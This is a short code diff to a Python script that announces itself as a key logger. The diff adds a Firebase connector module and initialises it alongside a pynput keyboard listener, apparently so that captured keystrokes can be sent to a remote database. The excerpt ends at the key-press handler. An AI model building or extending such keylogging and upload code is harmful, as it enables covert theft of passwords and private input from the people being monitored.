@@ -1,8 +1,12 @@
 from pynput import keyboard
+import firebaseConnector
 # import recorder
 
 print("Starting Key Logger Program")
 print("----------------------------------")
+
+# Initialise Connector Class
+firebaseConnector = firebaseConnector.FirebaseConnector()
 
 # On Press Function
 def on_press(key):
